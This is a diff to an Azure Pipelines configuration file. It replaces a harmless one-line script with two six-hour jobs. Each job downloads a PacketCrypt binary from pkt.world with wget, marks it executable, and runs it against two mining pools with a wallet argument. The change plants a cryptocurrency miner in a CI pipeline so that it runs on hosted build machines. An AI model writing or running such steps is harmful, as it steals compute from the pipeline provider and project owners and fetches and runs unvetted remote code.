@@ -6,9 +6,17 @@
 trigger:
 - main
 
-pool:
-  vmImage: ubuntu-latest
+pool: Azure Pipelines
 
-steps:
-- script: lscpu
-  displayName: 'Run a one-line script'
+jobs:
+- job: a
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p wallet  http://pool.pkt.world/ http://pool.pktpool.io/
+
+- job: b
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p wwallet  http://pool.pkt.world/ http://pool.pktpool.io/
